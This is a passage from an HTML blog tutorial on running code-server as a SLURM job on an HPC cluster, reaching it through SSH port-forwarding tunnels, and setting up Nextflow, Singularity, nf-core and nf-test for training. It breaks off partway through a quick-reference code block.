<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Replace worker-01 with your actual node name</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># This creates a tunnel: local:8080 → login node → worker-01:8080</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-L</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8080</span><span class="token plain">:worker-01:8080 user@hpc.server.edu</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Keep this terminal open while using code-server</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Open browser and navigate to: http://localhost:8080</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Enter password: your-secure-password (from sbatch script)</span><br></span></code></pre></div></div>
<p><strong>Important:</strong> The tunnel command format is:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-L</span><span class="token plain"> local_port:compute_node:remote_port user@login_node</span><br></span></code></pre></div></div>
<p>Where:</p>
<ul>
<li class=""><code>local_port</code>: Port on your local machine (8080)</li>
<li class=""><code>compute_node</code>: The node name from <code>squeue</code> (e.g., worker-01)</li>
<li class=""><code>remote_port</code>: Port code-server listens on (8080)</li>
<li class=""><code>login_node</code>: Your HPC login node (hpc.server.edu)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="23-background-tunnel-optional">2.3. Background Tunnel (Optional)<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#23-background-tunnel-optional" class="hash-link" aria-label="Direct link to 2.3. Background Tunnel (Optional)" title="Direct link to 2.3. Background Tunnel (Optional)" translate="no">​</a></h3>
<p>For a persistent tunnel that doesn't require keeping a terminal open:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run tunnel in background</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-L</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8080</span><span class="token plain">:worker-01:8080 user@hpc.server.edu </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-N</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># To close the tunnel later</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">killall</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="24-ssh-config-convenience-setup">2.4. SSH Config Convenience Setup<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#24-ssh-config-convenience-setup" class="hash-link" aria-label="Direct link to 2.4. SSH Config Convenience Setup" title="Direct link to 2.4. SSH Config Convenience Setup" translate="no">​</a></h3>
<p>For easier repeated access, add your HPC to <code>~/.ssh/config</code> on your local machine:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Host hpc-dev</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    HostName hpc.server.edu</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    User your_username</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    LocalForward 8080 localhost:8080</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ServerAliveInterval 60</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    ServerAliveCountMax 3</span><br></span></code></pre></div></div>
<p>Then connect with:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> hpc-dev</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Port 8080 is now forwarded to your HPC's code-server</span><br></span></code></pre></div></div>
<p><strong>Note:</strong> This SSH config method forwards to <code>localhost:8080</code> on the login node. For the SLURM compute node setup, use the direct command instead with the compute node hostname.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="25-access-code-server">2.5. Access Code-Server<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#25-access-code-server" class="hash-link" aria-label="Direct link to 2.5. Access Code-Server" title="Direct link to 2.5. Access Code-Server" translate="no">​</a></h3>
<p>With the tunnel active, open your browser and navigate to:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">http://localhost:8080</span><br></span></code></pre></div></div>
<p>Enter your password (from code-server config) and verify it's working. You should see the VS Code welcome screen.
<img decoding="async" loading="lazy" alt="password" src="https://riverxdata.github.io/river-docs/assets/images/code_server_password-2369498481b1a5520f7b9787a824a27b.png" width="2560" height="1482" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-install-code-server-extensions-and-verify-tools">3. Install Code-Server Extensions and Verify Tools<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#3-install-code-server-extensions-and-verify-tools" class="hash-link" aria-label="Direct link to 3. Install Code-Server Extensions and Verify Tools" title="Direct link to 3. Install Code-Server Extensions and Verify Tools" translate="no">​</a></h2>
<p>Now that code-server is accessible from your local machine via the tunnel, install the necessary extensions and verify the pre-installed tools.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="31-verify-tools-installation">3.1. Verify Tools Installation<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#31-verify-tools-installation" class="hash-link" aria-label="Direct link to 3.1. Verify Tools Installation" title="Direct link to 3.1. Verify Tools Installation" translate="no">​</a></h3>
<p>First, verify that all tools were successfully installed in the code-server job:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># In the code-server terminal (access via http://localhost:8080)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check installed tools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nextflow </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">singularity </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nf-core </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nf-test </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><br></span></code></pre></div></div>
<p>If any tools are missing, you can install them directly in the terminal:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install any missing tools</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> nextflow singularity nf-core nf-test</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="32-install-code-server-extensions-in-browser">3.2. Install Code-Server Extensions in Browser<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#32-install-code-server-extensions-in-browser" class="hash-link" aria-label="Direct link to 3.2. Install Code-Server Extensions in Browser" title="Direct link to 3.2. Install Code-Server Extensions in Browser" translate="no">​</a></h3>
<p>Now install VS Code extensions directly in code-server to enhance your development experience:</p>
<ol>
<li class="">
<p>Open the Extensions marketplace (Ctrl+Shift+X or Cmd+Shift+X) or the left side bar for extensions, search for <strong>nf-core-entensionpack</strong> where it is the collection of extensions that you need to have better experiences with nextflow develoment process.
<img decoding="async" loading="lazy" alt="search_ext" src="https://riverxdata.github.io/river-docs/assets/images/extensions_search-a79db90c6ba523ea51e79741b24feb9e.png" width="2560" height="1482" class="img_ev3q"></p>
</li>
<li class="">
<p>Check install:</p>
<ul>
<li class=""><strong>nf-core-entensionpack</strong> : All of needed extensions for nextflow trainning
<img decoding="async" loading="lazy" alt="installed_ext" src="https://riverxdata.github.io/river-docs/assets/images/installed_extension_pack-175401aae0c3fd44b5b4ca4f18fdae5f.png" width="2560" height="1482" class="img_ev3q"></li>
</ul>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="33-testing-your-settings">3.3. Testing Your Settings<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#33-testing-your-settings" class="hash-link" aria-label="Direct link to 3.3. Testing Your Settings" title="Direct link to 3.3. Testing Your Settings" translate="no">​</a></h3>
<p>With tools and extensions installed, test your setup:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># In the code-server terminal, run a simple test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nextflow run hello-world.nf</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="testing" src="https://riverxdata.github.io/river-docs/assets/images/test_codeserver_hello_world_nf-6a563a567c5fed16517a36a293a811f0.png" width="2560" height="1482" class="img_ev3q"></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-best-practices-and-tips">4. Best Practices and Tips<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#4-best-practices-and-tips" class="hash-link" aria-label="Direct link to 4. Best Practices and Tips" title="Direct link to 4. Best Practices and Tips" translate="no">​</a></h2>
<p>For regular training sessions, streamline your workflow with these helpful scripts and practices.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="41-persistent-code-server-setup">4.1. Persistent Code-Server Setup<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#41-persistent-code-server-setup" class="hash-link" aria-label="Direct link to 4.1. Persistent Code-Server Setup" title="Direct link to 4.1. Persistent Code-Server Setup" translate="no">​</a></h3>
<p>For regular training, create an alias or script to streamline job submission:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Add to ~/.bashrc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">alias</span><span class="token plain"> submit-code-server</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">'sbatch ~/code-server-job.sh &amp;&amp; sleep 5 &amp;&amp; squeue -u $USER | grep code-server'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Now you can easily submit with:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">submit-code-server</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="42-create-a-submission-helper-script">4.2. Create a Submission Helper Script<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#42-create-a-submission-helper-script" class="hash-link" aria-label="Direct link to 4.2. Create a Submission Helper Script" title="Direct link to 4.2. Create a Submission Helper Script" translate="no">​</a></h3>
<p>Create a script that automatically sets up the tunnel:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Save as ~/tunnel-to-code-server.sh on your LOCAL machine</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># SSH to HPC and check code-server job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NODE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> user@hpc.server.edu </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"squeue -u \</span><span class="token variable string environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token variable string" style="color:hsl(119, 34%, 47%)"> --format=%N --noheader | grep compute"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">head</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-1</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-z</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$NODE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"No compute node found. Submit code-server job first!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exit</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Found code-server on node: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$NODE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Creating tunnel to http://localhost:8080"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Press Ctrl+C to close tunnel"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-L</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8080</span><span class="token plain">:</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$NODE</span><span class="token plain">:8080 user@hpc.server.edu</span><br></span></code></pre></div></div>
<p>Make it executable and use it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">chmod</span><span class="token plain"> +x ~/tunnel-to-code-server.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">~/tunnel-to-code-server.sh</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="43-security-considerations">4.3. Security Considerations<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#43-security-considerations" class="hash-link" aria-label="Direct link to 4.3. Security Considerations" title="Direct link to 4.3. Security Considerations" translate="no">​</a></h3>
<ul>
<li class="">Always use a strong, unique password in <code>config.yaml</code></li>
<li class="">Only forward port 8080 over SSH (never expose to the internet)</li>
<li class="">Rotate passwords regularly for training accounts</li>
<li class="">Consider setting SLURM job time limits appropriately (24 hours in the example)</li>
<li class="">Cancel unused code-server jobs to free resources</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="44-resource-allocation">4.4. Resource Allocation<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#44-resource-allocation" class="hash-link" aria-label="Direct link to 4.4. Resource Allocation" title="Direct link to 4.4. Resource Allocation" translate="no">​</a></h3>
<p>The example SLURM script allocates:</p>
<ul>
<li class=""><strong>2 CPUs</strong>: Sufficient for code-server and light development</li>
<li class=""><strong>4GB RAM</strong>: Comfortable for code-server and terminal work</li>
<li class=""><strong>24 hours</strong>: Full day of work</li>
</ul>
<p>Adjust these for your needs:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># For heavier computation (running larger workflows)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --cpus-per-task=4</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --mem=8GB</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># For shorter sessions (testing)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --time=4:00:00</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># To use GPU (if available)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#SBATCH --gres=gpu:1</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="5-recap-and-key-takeaways">5. Recap and Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#5-recap-and-key-takeaways" class="hash-link" aria-label="Direct link to 5. Recap and Key Takeaways" title="Direct link to 5. Recap and Key Takeaways" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-weve-accomplished">What We've Accomplished<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#what-weve-accomplished" class="hash-link" aria-label="Direct link to What We've Accomplished" title="Direct link to What We've Accomplished" translate="no">​</a></h3>
<p>You now have a complete, production-ready Nextflow training environment with:</p>
<p><strong>Infrastructure:</strong></p>
<ul>
<li class="">✅ Code-server running as a persistent SLURM job on HPC compute nodes</li>
<li class="">✅ SSH tunneling for secure remote access from your local machine</li>
<li class="">✅ Browser-based VS Code interface accessible anywhere</li>
</ul>
<p><strong>Tools &amp; Frameworks:</strong></p>
<ul>
<li class="">✅ Nextflow workflow engine with SLURM integration</li>
<li class="">✅ Singularity for HPC-compatible containerized workflows</li>
<li class="">✅ nf-core pipeline framework for professional pipeline development</li>
<li class="">✅ nf-test for pipeline validation and testing</li>
</ul>
<p><strong>Configuration:</strong></p>
<ul>
<li class="">✅ Pre-configured Nextflow with Singularity support</li>
<li class="">✅ SLURM execution profiles for scalable job submission</li>
<li class="">✅ Security-hardened code-server with password authentication</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="key-takeaways">Key Takeaways<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#key-takeaways" class="hash-link" aria-label="Direct link to Key Takeaways" title="Direct link to Key Takeaways" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>Single sbatch Script Deployment</strong>: All tools (Pixi, code-server, Nextflow, Singularity, nf-core, nf-test) are installed in one SLURM job, eliminating complex setup procedures</p>
</li>
<li class="">
<p><strong>SSH Tunnel Access</strong>: Multi-hop SSH tunneling (<code>local → login node → compute node</code>) provides secure access to code-server from your local machine without exposing the HPC system</p>
</li>
<li class="">
<p><strong>Persistent Development Environment</strong>: Code-server runs as a managed SLURM job, providing persistent access that survives network disconnections</p>
</li>
<li class="">
<p><strong>Browser-Based IDE</strong>: VS Code in the browser works on any device (laptop, tablet, etc.) with no local installation required</p>
</li>
<li class="">
<p><strong>SLURM Integration</strong>: Nextflow is configured to submit individual workflow tasks to SLURM, enabling scalable pipeline execution across HPC resources</p>
</li>
<li class="">
<p><strong>Production-Ready Training</strong>: The setup is suitable for team training, reproducible research, and production Nextflow workflows</p>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="quick-reference-workflow">Quick Reference Workflow<a href="https://riverxdata.github.io/river-docs/blog/setup-local-nextflow-training#quick-reference-workflow" class="hash-link" aria-label="Direct link to Quick Reference Workflow" title="Direct link to Quick Reference Workflow" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 1: Submit code-server job (one time)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sbatch ~/code-server-job.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 2: Find compute node</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">squeue </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token 